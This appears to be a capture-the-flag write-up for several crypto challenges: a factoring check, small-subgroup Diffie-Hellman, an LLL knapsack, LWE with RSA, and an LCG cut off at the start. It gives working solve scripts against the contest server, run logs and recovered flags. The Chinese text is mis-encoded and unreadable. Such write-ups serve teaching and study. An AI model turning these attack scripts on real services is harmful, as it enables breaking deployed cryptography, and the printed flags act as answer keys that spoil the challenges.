    # 2) ç¬¬ä¸€å…³å¼€åœºç™½
    io.recvline()                    # "wel_come_to_the_first_1111111_heiheihei"

    # 3) ç¬¬ä¸€å…³ç»™ n å’Œ gift1ï¼ˆå¤šè¡Œï¼‰ã€‚è¯»åˆ° gift1 æç¤ºè¡Œå³å¯ã€‚
    io.recvuntil(b"gift1=")
    io.recvline()                    # æŠŠ gift1 è¿™ä¸€è¡Œè¯»æ‰

    # 4) ç¬¬ä¸€å…³æäº¤ä¸€ä¸ªèƒ½æ•´é™¤ n çš„æ•°ï¼š1 å³å¯
    io.sendline(b"1")

    # 5) ç¬¬äºŒå…³ä¿¡æ¯ï¼ˆå¤šè¡Œï¼‰ï¼šn, gift2, hint, rã€‚è¯»åˆ° r è¿™ä¸€è¡Œå³å¯ã€‚
    io.recvuntil(b"r=")
    io.recvline()                    # æŠŠ r è¿™ä¸€è¡Œè¯»æ‰

    # 6) ç¬¬äºŒå…³éšä¾¿å›ï¼ˆ1 ä¹Ÿè¡Œï¼‰
    io.sendline(b"1")

    # 7) æœåŠ¡ç«¯æœ€åä¼šå‘å‡º "hajimiyonanbolvduo{flag}" è¿™ä¸€è¡Œ
    io.recvuntil(b"hajimiyonanbolvduo")
    flag = io.recvline().decode().strip()
    print("flag{" + flag + "}")

    io.close()

if __name__ == "__main__":
    main()
```

### è¯´æ˜

- ç¬¬ä¸€æ¬¡ `recvline()` åå¿…é¡» `sendline()` ä¸€ä¸‹ï¼Œä¸ç„¶å¡åœ¨æ¡æ‰‹å¤„ã€‚
- ä¸¤å…³éƒ½ä¸ç”¨å› å¼åˆ†è§£ï¼Œç¬¬ä¸€å…³å‘ `1`ï¼Œç¬¬äºŒå…³éšä¾¿å‘ï¼ˆ`1` æœ€ç®€å•ï¼‰ã€‚
- å– flag çš„åšæ³•ï¼š`recvuntil("hajimiyonanbolvduo")` åè¯»å‰©ä½™ä¸€è¡Œå³ä¸ºå®é™… `{...}` å†…å®¹ã€‚

ç¥ä½ ä¸€å‘æ‹¿æ—— ğŸ¯

```
[x] Opening connection to geek.ctfplus.cn on port 30747
[x] Opening connection to geek.ctfplus.cn on port 30747: Trying 222.186.150.28
[+] Opening connection to geek.ctfplus.cn on port 30747: Done
flag{b'SYC{hahaha_th1_factor_is_N0t_ha16}'}
[*] Closed connection to geek.ctfplus.cn port 30747
```

# simple-DH

è§£å¯†è„šæœ¬ï¼ŒDè€å¸ˆè´Ÿè´£åˆ†æï¼ŒCè€å¸ˆè´Ÿè´£å®ç°

```
from pwn import *
from Crypto.Util.number import *
from sympy.ntheory import discrete_log
from sympy.ntheory.modular import crt
import re

context.log_level = 'info'

# å¸¸é‡å®šä¹‰
p = 162005261169344318401566230104702503064642137782409884504384217600032351339
g = 2
q_list = [2, 11, 599, 647, 659, 661, 673, 683, 719, 743, 821, 857, 859, 887, 1013]


def get_generator(q, p, g=2):
    """ç›´æ¥è®¡ç®—é˜¶ä¸ºqçš„ç”Ÿæˆå…ƒ"""
    return pow(g, (p - 1) // q, p)


def attack_subgroup(conn, q, g1):
    """æ”»å‡»å•ä¸ªå­ç¾¤ï¼Œè¿”å› b mod q"""
    print(f"\n[*] æ”»å‡»å­ç¾¤ q={q}")

    # å‘é€ç”Ÿæˆå…ƒ
    conn.recvuntil(b'give me your g:')
    conn.sendline(str(g1).encode())

    # æ¥æ”¶æœåŠ¡å™¨çš„A
    line = conn.recvline().decode()
    print(f"[DEBUG] æ”¶åˆ°: {line.strip()}")
    match = re.search(r'A is (\d+)', line)
    if not match:
        print(f"[-] æ— æ³•è§£æA")
        return None

    A = int(match.group(1))

    # è®¡ç®—ç¦»æ•£å¯¹æ•° a_temp mod q
    try:
        a_temp_mod_q = discrete_log(p, A, g1, q)
        print(f"[+] a_temp â‰¡ {a_temp_mod_q} (mod {q})")
    except Exception as e:
        print(f"[-] ç¦»æ•£å¯¹æ•°è®¡ç®—å¤±è´¥: {e}")
        return None

    # æšä¸¾ b mod q
    for b_candidate in range(q):
        # è®¡ç®—å€™é€‰çš„Key
        B = pow(g1, b_candidate, p)
        Key_candidate = pow(B, a_temp_mod_q, p)

        # å‘é€å€™é€‰Key
        conn.recvuntil(b'give me you a key:')
        conn.sendline(str(Key_candidate).encode())

        # æ£€æŸ¥å“åº”
        resp = conn.recvline().strip()

        if resp == b'ok_key':
            print(f"[+] æ‰¾åˆ°! b â‰¡ {b_candidate} (mod {q})")
            return b_candidate
        elif resp == b'no_key':
            if b_candidate < q - 1:  # ä¸æ˜¯æœ€åä¸€æ¬¡å°è¯•
                # ç»§ç»­ä¸‹ä¸€è½®ï¼Œéœ€è¦é‡æ–°å‘é€g1
                conn.recvuntil(b'give me your g:')
                conn.sendline(str(g1).encode())
                line = conn.recvline().decode()
                match = re.search(r'A is (\d+)', line)
                if match:
                    A_new = int(match.group(1))
                    # å¦‚æœAå˜äº†ï¼Œéœ€è¦é‡æ–°è®¡ç®—ç¦»æ•£å¯¹æ•°
                    if A_new != A:
                        A = A_new
                        try:
                            a_temp_mod_q = discrete_log(p, A, g1, q)
                        except:
                            pass
        else:
            print(f"[-] æ„å¤–å“åº”: {resp}")
            return None

    print(f"[-] æœªæ‰¾åˆ° b mod {q}")
    return None


def main():
    host = 'geek.ctfplus.cn'
    port = 30678

    try:
        # é¢„å…ˆè®¡ç®—æ‰€æœ‰ç”Ÿæˆå…ƒ
        print("[*] é¢„è®¡ç®—ç”Ÿæˆå…ƒ...")
        g1_list = []
        for q in q_list:
            g1 = get_generator(q, p, g)
            g1_list.append(g1)
            print(f"q={q:4d}, g1={g1}")

        # è¿æ¥æœåŠ¡å™¨ï¼ˆåªè¿æ¥ä¸€æ¬¡ï¼ï¼‰
        print("\n[*] è¿æ¥æœåŠ¡å™¨...")
        conn = remote(host, port)

        # æ¥æ”¶èœå•
        menu = conn.recvuntil(b'give me one number')
        print(f"[DEBUG] èœå•:\n{menu.decode()}")

        # æ­¥éª¤1: è·å–åŠ å¯†çš„flagï¼ˆé€‰æ‹©1ï¼‰
        print("\n[*] æ­¥éª¤1: è·å–åŠ å¯†çš„flag...")
        conn.sendline(b'1')

        # æ¥æ”¶åŠ å¯†æ•°æ® - å¤šè¯»å‡ è¡Œç¡®ä¿è·å–æ‰€æœ‰æ•°æ®
        data_lines = []
        for i in range(5):  # å¤šè¯»å‡ è¡Œ
            try:
                line = conn.recvline(timeout=1).decode()
                data_lines.append(line)
                print(f"[DEBUG] Line {i}: {line.strip()}")
            except:
                break

        # ä»æ‰€æœ‰è¡Œä¸­æå–Cå’ŒA1
        all_data = ''.join(data_lines)
        match_c = re.search(r'flag=(\d+)', all_data)
        match_a1 = re.search(r'A1=(\d+)', all_data)

        if not match_c or not match_a1:
            print(f"[-] æ— æ³•è§£æåŠ å¯†æ•°æ®")
            print(f"[DEBUG] å…¨éƒ¨æ•°æ®:\n{all_data}")
            conn.close()
            return

        C = int(match_c.group(1))
        A1 = int(match_a1.group(1))

        print(f"[+] C  = {C}")
        print(f"[+] A1 = {A1}")

        # æ­¥éª¤2: è¿›è¡Œå­ç¾¤æ”»å‡»ï¼ˆé€‰æ‹©2ï¼‰
        print("\n[*] æ­¥éª¤2: è¿›è¡ŒPohlig-Hellmanæ”»å‡»...")
        # åº”è¯¥å·²ç»æ”¶åˆ°äº† "give me one number"
        conn.sendline(b'2')

        # æ¥æ”¶DHç›¸å…³ä¿¡æ¯
        conn.recvuntil(b'go_go_go_go:DH')
        info = conn.recvline().decode()
        print(f"[DEBUG] {info.strip()}")

        # æ”»å‡»æ¯ä¸ªå­ç¾¤
        b_mod_q = {}
        for q, g1 in zip(q_list, g1_list):
            result = attack_subgroup(conn, q, g1)
            if result is not None:
                b_mod_q[q] = result
            else:
                print(f"[!] è­¦å‘Š: æ— æ³•æ¢å¤ b mod {q}")

        conn.close()

        # æ£€æŸ¥æ˜¯å¦æˆåŠŸæ¢å¤è¶³å¤Ÿçš„æ¨¡æ•°
        if len(b_mod_q) == 0:
            print("[-] æ²¡æœ‰æˆåŠŸæ¢å¤ä»»ä½•æ¨¡æ•°ï¼Œé€€å‡º")
            return

        print(f"\n[+] æˆåŠŸæ¢å¤ {len(b_mod_q)}/{len(q_list)} ä¸ªæ¨¡æ•°")
        print(f"[+] æ¢å¤çš„æ¨¡æ•°: {b_mod_q}")

        # æ­¥éª¤3: ä½¿ç”¨CRTæ¢å¤b
        print("\n[*] ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ¢å¤b...")
        moduli = list(b_mod_q.keys())
        residues = [b_mod_q[q] for q in moduli]

        b, M = crt(moduli, residues)
        print(f"[+] æ¢å¤çš„ b â‰¡ {b} (mod {M})")
        print(f"[+] M = {M}, 2^100 = {2 ** 100}")

        # æ­¥éª¤4: è§£å¯†flag
        print("\n[*] è§£å¯†flag...")
        Key = pow(A1, b, p)
        m = C ^ Key

        try:
            flag = long_to_bytes(m)
            print(f"\n[+] Flag: {flag.decode()}")
        except:
            print(f"[-] è§£å¯†å¯èƒ½ä¸å®Œæ•´ï¼Œm = {m}")
            # å°è¯•éƒ¨åˆ†è§£ç 
            try:
                flag_bytes = long_to_bytes(m)
                print(f"[+] Flag (bytes): {flag_bytes}")
            except:
                pass

    except Exception as e:
        print(f"\n[-] é”™è¯¯: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
```

ç»“æœ

```
[*] é¢„è®¡ç®—ç”Ÿæˆå…ƒ...
q=   2, g1=162005261169344318401566230104702503064642137782409884504384217600032351338
q=  11, g1=59930386953305988708696633635768582408848112062228307251192202655985065979
q= 599, g1=138424414241407688545944900626073185135378140902566123324301814596663898309
q= 647, g1=144142658373929268232027523809767397367528410775979209601305479123873258109
q= 659, g1=160835064574762567937178188089833843416713103531028962048769109641813529824
q= 661, g1=70783197611115684183062351394995815854390511011769603547512498866537619570
q= 673, g1=73707549726189318941276617506422053273998915280996422553856422255220652390
q= 683, g1=101466592283826332607098482896079440958325911009486868279441269096381767692
q= 719, g1=149259980569203009755612808493222624987028346743504446791467943816010559224
q= 743, g1=155373870838889135201960414235958512211199384997014102178801551791912855045
q= 821, g1=58774800333782639064697430762794055152339872473505158019611314579698457881
q= 857, g1=49295879481628402286911211253080174983859289962773830168141394463808789567
q= 859, g1=14788649680656549646249389085262314793974066459523755165939023789139460459
q= 887, g1=62389447977019766637750757700204244901367413936059721503238468441809047122
q=1013, g1=17399130590325651078966523539656290994418960021140176359812871990716306882

[*] è¿æ¥æœåŠ¡å™¨...
[x] Opening connection to geek.ctfplus.cn on port 30678
[x] Opening connection to geek.ctfplus.cn on port 30678: Trying 222.186.150.28
[+] Opening connection to geek.ctfplus.cn on port 30678: Done
[DEBUG] èœå•:

    chose:
    1----encrypt
    2----handle_client
    3--- quit
    give me one number

[*] æ­¥éª¤1: è·å–åŠ å¯†çš„flag...
[DEBUG] Line 0: 
[DEBUG] Line 1: this is cipher flag=85405478992356612190137917829576399528873355448478407526114479962507717842
[DEBUG] Line 2: this is A1=2766460486360099890768250490063182901288112061342294536159899933593555866.next
[DEBUG] Line 3: give me one number
[DEBUG] Line 4: 
[+] C  = 85405478992356612190137917829576399528873355448478407526114479962507717842
[+] A1 = 2766460486360099890768250490063182901288112061342294536159899933593555866

[*] æ­¥éª¤2: è¿›è¡ŒPohlig-Hellmanæ”»å‡»...
[DEBUG] 

[*] æ”»å‡»å­ç¾¤ q=2
[DEBUG] æ”¶åˆ°: hey you know the A is 162005261169344318401566230104702503064642137782409884504384217600032351338, g=162005261169344318401566230104702503064642137782409884504384217600032351338.
[+] a_temp â‰¡ 1 (mod 2)
[+] æ‰¾åˆ°! b â‰¡ 1 (mod 2)

[*] æ”»å‡»å­ç¾¤ q=11
[DEBUG] æ”¶åˆ°: hey you know the A is 19285449967108925876276062325995976626547316733516790375651010406286136215, g=59930386953305988708696633635768582408848112062228307251192202655985065979.
[+] a_temp â‰¡ 9 (mod 11)
[+] æ‰¾åˆ°! b â‰¡ 4 (mod 11)

[*] æ”»å‡»å­ç¾¤ q=599
[DEBUG] æ”¶åˆ°: hey you know the A is 81903467344609543770827839115207351679541816508244609159398479027317845097, g=138424414241407688545944900626073185135378140902566123324301814596663898309.
[+] a_temp â‰¡ 3 (mod 599)
[+] æ‰¾åˆ°! b â‰¡ 55 (mod 599)

[*] æ”»å‡»å­ç¾¤ q=647
[DEBUG] æ”¶åˆ°: hey you know the A is 29669444069130860406186418869479320550255923980324456376581183516345785481, g=144142658373929268232027523809767397367528410775979209601305479123873258109.
[+] a_temp â‰¡ 434 (mod 647)
[+] æ‰¾åˆ°! b â‰¡ 124 (mod 647)

[*] æ”»å‡»å­ç¾¤ q=659
[DEBUG] æ”¶åˆ°: hey you know the A is 58614980716675033472194063157485751583989522397047232421284769047370501303, g=160835064574762567937178188089833843416713103531028962048769109641813529824.
[+] a_temp â‰¡ 225 (mod 659)
[+] æ‰¾åˆ°! b â‰¡ 185 (mod 659)

[*] æ”»å‡»å­ç¾¤ q=661
[DEBUG] æ”¶åˆ°: hey you know the A is 37330102274373347959319259862108297562697253704442505596810205318324148985, g=70783197611115684183062351394995815854390511011769603547512498866537619570.
[+] a_temp â‰¡ 24 (mod 661)
[+] æ‰¾åˆ°! b â‰¡ 612 (mod 661)

[*] æ”»å‡»å­ç¾¤ q=673
[DEBUG] æ”¶åˆ°: hey you know the A is 150524358080979577653155690584012297531596944537193324898107720238068585379, g=73707549726189318941276617506422053273998915280996422553856422255220652390.
[+] a_temp â‰¡ 146 (mod 673)
[+] æ‰¾åˆ°! b â‰¡ 245 (mod 673)

[*] æ”»å‡»å­ç¾¤ q=683
[DEBUG] æ”¶åˆ°: hey you know the A is 49269907060576529540505065730983312116041313708824036434775176396342767463, g=101466592283826332607098482896079440958325911009486868279441269096381767692.
[+] a_temp â‰¡ 104 (mod 683)
[+] æ‰¾åˆ°! b â‰¡ 559 (mod 683)

[*] æ”»å‡»å­ç¾¤ q=719
[DEBUG] æ”¶åˆ°: hey you know the A is 131190982339585398991545941963806754302604568857252403934916650251346729364, g=149259980569203009755612808493222624987028346743504446791467943816010559224.
[+] a_temp â‰¡ 689 (mod 719)
[+] æ‰¾åˆ°! b â‰¡ 189 (mod 719)

[*] æ”»å‡»å­ç¾¤ q=743
[DEBUG] æ”¶åˆ°: hey you know the A is 28875079904132287776569160417485997619847477198785713479936521753535459433, g=155373870838889135201960414235958512211199384997014102178801551791912855045.
[+] a_temp â‰¡ 101 (mod 743)
[+] æ‰¾åˆ°! b â‰¡ 343 (mod 743)

[*] æ”»å‡»å­ç¾¤ q=821
[DEBUG] æ”¶åˆ°: hey you know the A is 80683939174123044932125243624376689224135441255398578929479527389505943036, g=58774800333782639064697430762794055152339872473505158019611314579698457881.
[+] a_temp â‰¡ 144 (mod 821)
[+] æ‰¾åˆ°! b â‰¡ 262 (mod 821)

[*] æ”»å‡»å­ç¾¤ q=857
[DEBUG] æ”¶åˆ°: hey you know the A is 154938894624124927461189124736747860127641664537132306950398913487289120996, g=49295879481628402286911211253080174983859289962773830168141394463808789567.
[+] a_temp â‰¡ 420 (mod 857)
[+] æ‰¾åˆ°! b â‰¡ 138 (mod 857)

[*] æ”»å‡»å­ç¾¤ q=859
[DEBUG] æ”¶åˆ°: hey you know the A is 12768477179142858775967284573575056411250046963526090954996286541313212734, g=14788649680656549646249389085262314793974066459523755165939023789139460459.
[+] a_temp â‰¡ 283 (mod 859)
[+] æ‰¾åˆ°! b â‰¡ 83 (mod 859)

[*] æ”»å‡»å­ç¾¤ q=887
[DEBUG] æ”¶åˆ°: hey you know the A is 3254435617711120451985570932143477135605819134660545153695437354249589313, g=62389447977019766637750757700204244901367413936059721503238468441809047122.
[+] a_temp â‰¡ 231 (mod 887)
[+] æ‰¾åˆ°! b â‰¡ 370 (mod 887)

[*] æ”»å‡»å­ç¾¤ q=1013
[DEBUG] æ”¶åˆ°: hey you know the A is 159000304216625928559045647278857294829533178413812944530532937963523754371, g=17399130590325651078966523539656290994418960021140176359812871990716306882.
[+] a_temp â‰¡ 967 (mod 1013)
[+] æ‰¾åˆ°! b â‰¡ 189 (mod 1013)
[*] Closed connection to geek.ctfplus.cn port 30678

[+] æˆåŠŸæ¢å¤ 15/15 ä¸ªæ¨¡æ•°
[+] æ¢å¤çš„æ¨¡æ•°: {2: 1, 11: 4, 599: 55, 647: 124, 659: 185, 661: 612, 673: 245, 683: 559, 719: 189, 743: 343, 821: 262, 857: 138, 859: 83, 887: 370, 1013: 189}

[*] ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ¢å¤b...
[+] æ¢å¤çš„ b â‰¡ 720044828533656602878167010375 (mod 495272640976061597737348214930665637926)
[+] M = 495272640976061597737348214930665637926, 2^100 = 1267650600228229401496703205376

[*] è§£å¯†flag...

[+] Flag: syc{de_sheN1_Y1che9g_D1ng_j0}
```

# ezLLL

æŠŠé¢˜ç›®é™„ä»¶äº¤ç»™aiï¼ŒæŠŠé”™è¯¯æç¤ºç»™å®ƒï¼Œä¸¤ä¸‰æ¬¡åç»™çš„è„šæœ¬

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
åˆ©ç”¨ 73 ç»´ä½å¯†åº¦èƒŒåŒ…æ ¼ + LLL ç›´æ¥æ¢å¤ 72 ä¸ª base64 å­—èŠ‚ã€‚
ä¸è°ƒç”¨ SVP/BKZï¼Œå› æ­¤ä¸ä¼šè§¦å‘ fpylll çš„ 'infinite loop in babai' ä¹‹ç±»çš„é”™è¯¯ã€‚
"""

import base64
from fpylll import IntegerMatrix, LLL
from Crypto.Util.number import long_to_bytes  # å…¶å®æœ€åä¹Ÿç”¨ä¸åˆ°é•¿æ•´è½¬å­—èŠ‚

# ================== 1. é¢˜ç›®ç»™å‡ºçš„å¸¸æ•° ==================
# ç›´æ¥ç¡¬ç¼–ç ï¼Œä¹Ÿå¯ä»¥ä» output.txt è§£æï¼Œè¿™é‡Œå›¾çœäº‹
c0 = 3038112798633297184662383622304935743085885557233749158956007073849612482288376427868177129794650629723820320354956421200731057248206923390266126724749
c1 = 3067905676575976394191697470198775983424017171927789349465114051806662220809274519404690237600876120098160925189141020955735592394058043223836997390364
c2 = 161718305745223416862626464966392423773787018933651874103999525456915447775033958634175772362315345532256900450737279647892731432357809002698314267166
c4 = 28062790413629718933986669054186703589109523209003558087731275662743174344133808251212801549266309585389771008410013425648388045766331470112982955563124028892325281968496755965862457760066899153866340566596633175020232648844383549331469

# ================== 2. è®¡ç®— 72 ä¸ªæƒé‡ w_i ==================
# bytes_to_long æ˜¯å¤§ç«¯ï¼š
#   x = sum(part[i] * 256^(len(part)-1-i))
# æ‰€ä»¥å‰ 12 å­—èŠ‚å¯¹åº”æŒ‡æ•° 11..0ï¼Œç­‰ç­‰

def build_weights():
    weights = []

    # ç¬¬ä¸€æ®µï¼šé•¿åº¦ 12ï¼Œå¯¹åº” x0
    for idx in range(12):
        exp = 11 - idx
        weights.append(c0 * (256 ** exp))

    # ç¬¬äºŒæ®µï¼šé•¿åº¦ 24ï¼Œå¯¹åº” x1
    for idx in range(24):
        exp = 23 - idx
        weights.append(c1 * (256 ** exp))

    # ç¬¬ä¸‰æ®µï¼šé•¿åº¦ 36ï¼Œå¯¹åº” x2
    for idx in range(36):
        exp = 35 - idx
        weights.append(c2 * (256 ** exp))

    assert len(weights) == 72
    return weights

# ================== 3. æ„é€  73x73 æ ¼åŸºçŸ©é˜µå¹¶ LLL ==================

def recover_flag():
    weights = build_weights()
    n = 72  # å­—èŠ‚ä¸ªæ•°

    print("[*] Building %dx%d lattice basis..." % (n+1, n+1))
    M = IntegerMatrix(n+1, n+1)

    # å‰ 72 è¡Œï¼šå•ä½å‘é‡ + w_i
    for i in range(n):
        for j in range(n+1):
            M[i, j] = 0
        M[i, i] = 1
        M[i, n] = weights[i]

    # æœ€åä¸€è¡Œï¼šå…¨ 0ï¼Œæœ€åä¸€ä¸ªæ˜¯ c4
    for j in range(n):
        M[n, j] = 0
    M[n, n] = c4

    print("[*] Running LLL reduction (no SVP/BKZ)...")
    LLL.reduction(M)  # é»˜è®¤å‚æ•°å°±å¤Ÿç”¨äº†

    print("[*] LLL done. Scanning rows for a short vector with last coord = 0...")

    rows = []
    for i in range(n+1):
        row = [int(M[i, j]) for j in range(n+1)]
        rows.append(row)

    # å°è¯•æ‰¾å‡ºæœ€åä¸€ç»´ä¸º 0ï¼Œå‰ 72 ç»´å…¨éƒ¨åœ¨åˆç†å­—èŠ‚èŒƒå›´çš„å°å‘é‡
    candidate = None
    for idx, r in enumerate(rows):
        last = r[-1]
        if last != 0:
            continue

        v = r[:-1]
        # åŒæ—¶è€ƒè™‘æ­£è´Ÿä¸¤ç§æ–¹å‘
        for sign in (1, -1):
            vv = [sign * x for x in v]

            # ç®€å•è¿‡æ»¤ï¼šå­—èŠ‚åº”è¯¥åœ¨ 0..127 / 0..255 è¿™ç§çº§åˆ«
            if not all(-5 <= x <= 260 for x in vv):
                continue

            # å†ä¸¥æ ¼ä¸€ç‚¹ï¼š0..127
            if not all(0 <= x < 128 for x in vv):
                continue

            # éªŒè¯æ˜¯å¦çœŸçš„æ»¡è¶³ sum w_i * b_i == c4
            s = sum(weights[i] * vv[i] for i in range(n))
            if s == c4:
                candidate = vv
                print(f"[+] Found candidate in row {idx}, sign={sign}")
                break

        if candidate is not None:
            break

    if candidate is None:
        raise SystemExit("[-] æ²¡æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å‘é‡ï¼Œå¯ä»¥æŠŠæ‰€æœ‰è¡Œæ‰“å°å‡ºæ¥æ‰‹åŠ¨è§‚å¯Ÿã€‚")

    print("[*] Candidate bytes (first 16 shown):", candidate[:16], "...")
    if not all(0 <= x < 128 for x in candidate):
        print("[!] Warning: some bytes out of 0..127 range, check manually.")

    b64_bytes = bytes(candidate)

    # æ‰“å° base64 ä¸²é¢„è§ˆ
    try:
        b64_str = b64_bytes.decode("ascii")
    except UnicodeDecodeError:
        raise SystemExit("[-] è§£ç  base64 å­—èŠ‚ä¸º ASCII å¤±è´¥ï¼Œè¯´æ˜å€™é€‰ä¸æ˜¯æ­£ç¡®çš„ base64ã€‚")

    print("[*] Base64 string (len=%d):" % len(b64_str))
    print("    ", b64_str)

    # ================== 4. base64 è§£ç å‡ºæœ€ç»ˆ flag ==================
    flag_bytes = base64.b64decode(b64_str)
    print("\n====== FLAG (raw bytes) ======")
    print(flag_bytes)

    print("\n====== FLAG (utf-8, errors='ignore') ======")
    print(flag_bytes.decode("utf-8", errors="ignore"))

    # å¦‚æœä½ æƒ³çœ‹æ¯ä¸ªå­—èŠ‚å¯¹åº”çš„å­—ç¬¦ï¼ˆåŒ…æ‹¬é ASCIIï¼‰ï¼Œå¯ä»¥ç”¨ latin-1 æ˜ å°„ï¼š
    print("\n====== FLAG (latin-1 æ˜ å°„) ======")
    print(flag_bytes.decode("latin-1", errors="replace"))

    return flag_bytes


if __name__ == "__main__":
    recover_flag()

```



è¿è¡Œç»“æœ

```
(latt) âœ  ~ python lll.py
[*] Building 73x73 lattice basis...
[*] Running LLL reduction (no SVP/BKZ)...
[*] LLL done. Scanning rows for a short vector with last coord = 0...
[+] Found candidate in row 62, sign=-1
[*] Candidate bytes (first 16 shown): [85, 49, 108, 68, 101, 122, 86, 65, 101, 86, 57, 111, 77, 122, 70, 77] ...
[*] Base64 string (len=72):
     U1lDezVAeV9oMzFMb190MF9UaGVfMWVuc3RyYS1MZW5zdHJhLUxvduFzel80bGdvciE3aG19

====== FLAG (raw bytes) ======
b'SYC{5@y_h31Lo_t0_The_1enstra-Lenstra-Lov\xe1sz_4lgor!7hm}'

====== FLAG (utf-8, errors='ignore') ======
SYC{5@y_h31Lo_t0_The_1enstra-Lenstra-Lovsz_4lgor!7hm}

====== FLAG (latin-1 æ˜ å°„) ======
SYC{5@y_h31Lo_t0_The_1enstra-Lenstra-LovÃ¡sz_4lgor!7hm}
```



# easy RSA?

## é¢˜ç›®åˆ†æ

è¿™æ˜¯ä¸€ä¸ªç»“åˆäº†RSAå’ŒLWEï¼ˆLearning With Errorsï¼‰çš„é—®é¢˜ã€‚å…³é”®çªç ´å£æ˜¯ï¼š

1. ä»LWEé—®é¢˜æ¢å¤ m
2. åˆ©ç”¨ p_m = p - m å¾—åˆ° p
3. ä» n = p * q æ¢å¤ q
4. è®¡ç®— inner æ¢å¤ c
5. è§£å¯†RSAå¾—åˆ°flag*

## è§£é¢˜ä»£ç 

python

```
from Crypto.Util.number import *
from gmpy2 import *

# å·²çŸ¥å‚æ•°
q1 = 65537
p1 = 257
delta = round(q1 / p1)  # 255
error_bound = 127

S = (34790, 60770, 29429, 54388, 22694, 50136, 13438, 7932, 46652, 9362, 44118, 48359, 50067, 29997, 63366, 36090, 7514, 16382, 24912, 369, 9261, 30671, 30689, 61154, 50897, 58137, 14927, 51518, 5782, 3971, 63594, 41078, 31477, 56610, 56084, 29542, 32843, 22096, 824, 52492, 33817, 24167, 38907, 48871, 24302, 62133, 60210, 7525, 55963, 48512, 16729, 26176, 37224, 14899, 11369, 38873, 41464, 30501, 23095, 21440, 14968, 36710, 15100, 50047)
A = (16147, 54417, 37346, 48225, 25834, 16202, 9615, 504, 54090, 24475, 53598, 20375, 4188, 42949, 38644, 5471, 48340, 49202, 58598, 31600, 17902, 22273, 4272, 58982, 16813, 41775, 46368, 20609, 4350, 16271, 14783, 21900, 63534, 6337, 38858, 35731, 39772, 52248, 38217, 48935, 1408, 50145, 24808, 4117, 12887, 13498, 27429, 61700, 47565, 44896, 50703, 64168, 27170, 31129, 5620, 63168, 45776, 13144, 23963, 25446, 60607, 17509, 34818, 1875)
b = 2764
p_m = 12332486510964011158671675941288876941680648099414795378886378613845684830972446231876321910330241399720401327967071598143881618549530749656312652927809332
e = 65537
c_inner = 83399431472999194690216705615169036306463958887795007046559917542746213139295638450504799784590430551922090084967974615725328386260579470125560123552483026894270772816722527064675899017519890685144620455393788325407207242732361884830126228889169785202880542117272251300802452717688849566335597550131883378114
n = 122559396923126188518673248748225863862082328215893788075556473340278133079967721064738539949068231864208941120351781811847301797522502385475722537534223195433223265299092527494031447238530457784670684950341075860748519372286474800355858313799189011550620881300518596006433001049004445597176250937388576661809
Q = 17609948494254197001867062519311260077211984293151667548900416829700969294407535620672384674573058455384106178087491089816127503299076697261227000724815039612665504495756229918248399034320834393598470026243543589231473237419452687730543063603595465136115669723541948895463396554918071128531213060909364601656950027389056898604223267691455263897256898136680792549706073818306730228357683709696946839634919997675816794970587698373035672596923359143664093017904285058387254576603859313018778309521049338455162936103498885466949142273058671319832535869174839812056921940398538003527621201520818008358558845582594247420459
P = 20652887190957239284631175340003902315126211938181093064207269195242550094032224965692251651673103425027250767184928851917797759012986735534298162794316194395592379533545344962294078494289760237724601340062723352085300184175255877738749851041498543752865574186669040985787587644798823596547499014922063118523650392438320527012937021768573183057529502842126637960161988353588863260221824429222676866093636690824910541149705709054550563060623762529654624849373383560043169934394338959338517866931347066483777887082048559999731906556171653815355183514550470420842104873391074567329742472001229790402635829640092130822763

# æ­¥éª¤1: è®¡ç®— inner = A Â· S mod q1
inner = sum(A[i] * S[i] for i in range(64)) % q1
print(f"inner = {inner}")

# æ­¥éª¤2: ä»LWEé—®é¢˜æ¢å¤m
# b = AÂ·S + m*delta + error (mod q1)
# æ‰€ä»¥: m*delta + error = b - AÂ·S (mod q1)
x = (b - inner) % q1
print(f"x = b - inner mod q1 = {x}")

# ç”±äº |error| <= 127ï¼Œå°è¯•æ¢å¤m
# è€ƒè™‘ä¸¤ç§æƒ…å†µï¼šxå¯èƒ½ä»£è¡¨æ­£æ•°æˆ–è´Ÿæ•°ï¼ˆæ¨¡q1ï¼‰
candidates_m = []
for offset in [0, -q1]:
    x_test = x + offset
    m_cand = round(x_test / delta)
    error_cand = x_test - m_cand * delta
    if abs(error_cand) <= error_bound:
        candidates_m.append((m_cand, error_cand))
        print(f"Candidate m = {m_cand}, error = {error_cand}")

# æ­¥éª¤3: ç”¨æ¯ä¸ªå€™é€‰må°è¯•æ¢å¤på’Œq
for m, error in candidates_m:
    p = p_m + m
    if n % p == 0:
        q = n // p
        print(f"\næ‰¾åˆ°æ­£ç¡®çš„ m = {m}")
        print(f"p = {p}")
        print(f"q = {q}")
        
        # æ­¥éª¤4: æ¢å¤å¯†æ–‡c
        c = c_inner + inner
        print(f"c = {c}")
        
        # æ­¥éª¤5: è§£å¯†
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)
        m_flag = pow(c, d, n)
        flag = long_to_bytes(m_flag)
        print(f"\nFlag: {flag}")
        break
```

è¿è¡Œè¿™ä¸ªè„šæœ¬åº”è¯¥èƒ½å¾—åˆ°flagã€‚å…³é”®ç‚¹æ˜¯ï¼š

1. ä»LWEé—®é¢˜ä¸­æ¢å¤å°çš„ç§˜å¯†å€¼m
2. åˆ©ç”¨è¿™ä¸ªmæ¢å¤RSAçš„è´¨å› æ•°p
3. è®¡ç®—innerå¹¶æ¢å¤å®Œæ•´çš„å¯†æ–‡c
4. æ ‡å‡†RSAè§£å¯†

ä½ è¿è¡Œä¸€ä¸‹è¿™ä¸ªè„šæœ¬ï¼Œåº”è¯¥å°±èƒ½å¾—åˆ°flagäº†ï¼



# EZ LCG

é¢˜ç›®ä¸¢ç»™aiç„¶åç”¨aiçš„è„šæœ¬

```
# -*- coding: utf-8 -*-
# éœ€è¦ Python 3.8+ï¼ˆç”¨ pow(x, -1, n) åšä¹˜æ³•é€†å…ƒï¼‰ï¼Œä¸ä¾èµ–ç¬¬ä¸‰æ–¹åº“

from math import gcd
from fractions import Fraction
from binascii import unhexlify

# ----------------- é¢˜ç›®ç»™çš„è¾“å‡ºï¼ˆæ¥è‡ª data.txtï¼‰ -----------------
